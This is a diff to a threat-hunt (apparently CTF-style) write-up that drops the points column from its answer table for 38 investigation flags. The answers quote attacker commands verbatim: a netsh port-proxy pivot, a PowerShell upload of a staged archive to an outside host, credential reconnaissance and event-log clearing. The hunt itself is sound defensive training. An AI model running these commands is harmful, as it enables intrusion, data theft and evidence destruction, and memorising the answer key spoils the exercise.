@@ -471,46 +471,46 @@ This is the full sequence of events in the order they happened:
 
 This is a record of every flag from the hunt, the answer, and how many points each was worth.
 
-| Flag | Question | Answer | Points |
-|------|----------|--------|--------|
-| Q00 | Environment Access | `SilentCorridorX_CL` | 10 |
-| Q01 | Suspicious Account | `s.brandt` | 50 |
-| Q02 | Origin of Failed Auth | `185.220.101.34` | 75 |
-| Q03 | Connection Footprint | `4` | 50 |
-| Q04 | Source Address Inventory | `45.153.160.88, 88.153.72.14, 91.234.33.126, 185.220.101.34` | 75 |
-| Q05 | Internal Landing Point | `WS-ENG04` | 50 |
-| Q06 | Initial Process | `systeminfo.exe/cmd.exe` | 75 |
-| Q07 | Directory Enumeration | `Domain Admins, Enterprise Admins` | 75 |
-| Q08 | Network Reconnaissance | `SRV-DC01, SRV-FILES02` | 75 |
-| Q09 | First Credential Activity | `tasklist /fi "imagename eq lsass.exe"` | 100 |
-| Q10 | Credential Dump Outcome | `NO/none` | 100 |
-| Q11 | Stored Credential Source | `SAM` | 75 |
-| Q12 | Saved Credentials | `cmdkey  /list` | 75 |
-| Q13 | First Lateral Pivot | `10.1.96.114/SRV-DC01/m.richter` | 100 |
-| Q14 | New Account Observed | `m.richter` | 75 |
-| Q15 | Cross-Host Spawning | `WMIC` | 100 |
-| Q16 | New Filesystem Activity | `C:\Windows\Temp\McAfee_Logs` | 75 |
-| Q17 | Critical File | `ntds.dit/m.richter` | 150 |
-| Q18 | Concurrent File Access | `MsMpEng.exe` | 75 |
-| Q19 | Database File Access | `ntdsutil` | 100 |
-| Q20 | Spawning Source | `WmiPrvSE.exe/WS-ENG04` | 100 |
-| Q21 | RDP Scope | `SRV-DC01, SRV-FILES02, WS-ENG04` | 75 |
-| Q22 | Network Configuration Change | `netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local` | 150 |
-| Q23 | Configuration Storage | `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` | 100 |
-| Q24 | Matching Configuration on DC | `netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp` | 150 |
-| Q25 | Targeted Directory | `C:\Engineering\Avionics\A400M_NavSys` | 75 |
-| Q26 | Packaged Output | `win_update_kb5034.zip` | 75 |
-| Q27 | Compression Method | `Compress-Archive` | 75 |
-| Q28 | Format Conversion | `certutil` | 75 |
-| Q29 | Outbound Transfer | `powershell  Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing` | 150 |
-| Q30 | External Destination | `cdn-telemetry.cloud-endpoint.net` | 100 |
-| Q31 | Reentry Window | `2` | 100 |
-| Q32 | First Cleanup Action | `wevtutil  cl Security` | 100 |
-| Q33 | Clearing Method Analysis | `WS-ENG04/SRV-DC01, SRV-FILES02` | 100 |
-| Q34 | Surviving Log Source | `Sysmon` | 150 |
-| Q35 | Exfiltration Confidence Call | `HIGH` (with supporting evidence) | 100 |
-| Q36 | DC Staging Cleanup | `cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs` | 100 |
-| Q37 | CISO Brief | Prose summary | 100 |
+| Flag | Question | Answer |
+|------|----------|--------|
+| Q00 | Environment Access | `SilentCorridorX_CL` |
+| Q01 | Suspicious Account | `s.brandt` |
+| Q02 | Origin of Failed Auth | `185.220.101.34` |
+| Q03 | Connection Footprint | `4` |
+| Q04 | Source Address Inventory | `45.153.160.88, 88.153.72.14, 91.234.33.126, 185.220.101.34` |
+| Q05 | Internal Landing Point | `WS-ENG04` |
+| Q06 | Initial Process | `systeminfo.exe/cmd.exe` |
+| Q07 | Directory Enumeration | `Domain Admins, Enterprise Admins` |
+| Q08 | Network Reconnaissance | `SRV-DC01, SRV-FILES02` |
+| Q09 | First Credential Activity | `tasklist /fi "imagename eq lsass.exe"` |
+| Q10 | Credential Dump Outcome | `NO/none` |
+| Q11 | Stored Credential Source | `SAM` |
+| Q12 | Saved Credentials | `cmdkey  /list` |
+| Q13 | First Lateral Pivot | `10.1.96.114/SRV-DC01/m.richter` |
+| Q14 | New Account Observed | `m.richter` |
+| Q15 | Cross-Host Spawning | `WMIC` |
+| Q16 | New Filesystem Activity | `C:\Windows\Temp\McAfee_Logs` |
+| Q17 | Critical File | `ntds.dit/m.richter` |
+| Q18 | Concurrent File Access | `MsMpEng.exe` |
+| Q19 | Database File Access | `ntdsutil` |
+| Q20 | Spawning Source | `WmiPrvSE.exe/WS-ENG04` |
+| Q21 | RDP Scope | `SRV-DC01, SRV-FILES02, WS-ENG04` |
+| Q22 | Network Configuration Change | `netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local` |
+| Q23 | Configuration Storage | `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` |
+| Q24 | Matching Configuration on DC | `netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp` |
+| Q25 | Targeted Directory | `C:\Engineering\Avionics\A400M_NavSys` |
+| Q26 | Packaged Output | `win_update_kb5034.zip` |
+| Q27 | Compression Method | `Compress-Archive` |
+| Q28 | Format Conversion | `certutil` |
+| Q29 | Outbound Transfer | `powershell  Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing` |
+| Q30 | External Destination | `cdn-telemetry.cloud-endpoint.net` |
+| Q31 | Reentry Window | `2` |
+| Q32 | First Cleanup Action | `wevtutil  cl Security` |
+| Q33 | Clearing Method Analysis | `WS-ENG04/SRV-DC01, SRV-FILES02` |
+| Q34 | Surviving Log Source | `Sysmon` |
+| Q35 | Exfiltration Confidence Call | `HIGH` (with supporting evidence) |
+| Q36 | DC Staging Cleanup | `cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs` |
+| Q37 | CISO Brief | Prose summary |
 
 ---
 
